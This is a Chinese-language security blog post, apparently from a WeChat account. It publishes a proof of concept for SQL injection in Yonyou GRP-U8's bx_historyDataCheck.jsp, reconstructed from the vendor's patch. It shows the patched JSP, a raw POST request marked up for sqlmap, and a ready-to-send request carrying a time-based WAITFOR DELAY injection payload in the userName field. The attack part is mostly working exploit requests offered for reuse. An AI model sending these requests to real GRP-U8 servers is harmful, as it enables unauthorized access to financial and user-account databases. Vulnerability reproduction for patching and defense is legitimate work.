#  【附POC】用友GRP-U8 bx_historyDataCheck.jsp SQL注入漏洞

原创 浪飒  [ 浪飒sec ](javascript:void\(0\);)

**浪飒sec** ![]()

微信号 langsasec

功能介绍 浪飒，共建网络安全

____

___发表于_

收录于合集

#漏洞复现 9 个

#用友 2 个

#漏洞通告 1 个

## 免责声明

> 本公众号所发布的文章及工具只限交流学习，本公众号不承担任何责任！如有侵权，请告知我们立即删除。

收不到推送的小伙伴，记得 **星标** 公众号哦！

![]()

## 前言

刚看到微步发的漏洞通告，所以给大家找一下POC，厂商不好意思发，我来发。

![]()

看我根据漏洞补丁复现漏洞，这漏洞很简单。

## 开始找POC

这是补丁说明，直接给了修复好的jsp让替换

![]()

朴实无华的修复方式：预编译+过滤

![]()

完整代码如下：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
     <%@ page contentType="text/html; charset=UTF-8"%> <%@ page import="java.util.*,java.sql.*,com.ufgov.midas.pt.common.DAOFactory"%> <%@ page import="com.ufgov.midas.qx.model.*,com.ufgov.midas.yy.util.*,java.io.PrintWriter"%> <%     request.setCharacterEncoding("UTF-8");     String userName = request.getParameter("userName");      String historyFlag = request.getParameter("historyFlag");//历史数据标志     String ysnd = request.getParameter("ysnd");//历史数据查询年度     Connection conn = null;     PreparedStatement pstmt = null;     ResultSet rs = null;     try {               // 获取一个数据库连接                 conn = DAOFactory.getInstance().getConnection();                                  StringBuffer sb = new StringBuffer();                        sb.append("select bm.bmdm,bm.bmmc,bm.gsdm,bm.kjnd,zy.zydm,zy.password,zy.zyxm from PUBBMXX bm left join PUBZYXX zy on bm.gsdm=zy.gsdm and bm.kjnd=zy.kjnd and bm.bmdm=zy.bmdm"                          + " where bm.kjnd=? and zy.zydm = ? ");                 String sql = sb.toString();                 //System.out.println(sql);                 //Update by yangll 20230905 安全漏洞处理1.增加预编译 2.过滤特殊字符                 ysnd = ysnd.replaceAll("(?i)waitfor", "");                 ysnd = ysnd.replaceAll("(?i)delay", "");                 userName = userName.replaceAll("(?i)waitfor", "");                 userName = userName.replaceAll("(?i)delay", "");                 pstmt = conn.prepareStatement(sql);                 pstmt.setString(1, ysnd);                 pstmt.setString(2, userName);                 rs = pstmt.executeQuery();                 if (rs.next()) {                     out.println("1");                 }else {                     out.println("0");                 }             } catch (Exception e) {                 System.out.println("######获取连接错误：" + e.getMessage());                                    e.printStackTrace();             }finally {           //关闭打开的操作                              DAOFactory.closeConnection(conn, pstmt, rs);         }         %>

上述代码中有三个传参，分别是userName，ysnd，historyFlag，利用POST传参即可发包，如下图：

![]()

数据包找到了下面我们找POC

### 方式一：

  *   *   *   *   *   *   * 

    
    
     POST /u8qx/bx_historyDataCheck.jsp HTTP/1.1 Host:  Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 59  userName=*&ysnd=*&historyFlag=*

直接将上述数据包使用sqlmap -r 1.txt即可 跑出payload

![]()

### 方式二：

jsp中对userName，ysnd两个参数过滤了WAITFOR，DELAY等关键词，因此猜测为延时注入，而一般该关键词的Payload都是联合注入形式，猜测payload为

  * 

    
    
     ';WAITFOR DELAY '0:0:5'

或者

  * 

    
    
     ";WAITFOR DELAY '0:0:5'

最终完整POC如下：

  *   *   *   *   *   *   * 

    
    
     POST /u8qx/bx_historyDataCheck.jsp HTTP/1.1 Host:  Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 57  userName=';WAITFOR DELAY '0:0:5'--&ysnd=&historyFlag=

下图为复现成功截图

![]()

## 总结

用友将代码放出来，让我们也可以体验一次当安全研究员的感觉，感谢大哥赏饭吃。

  
![]()

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

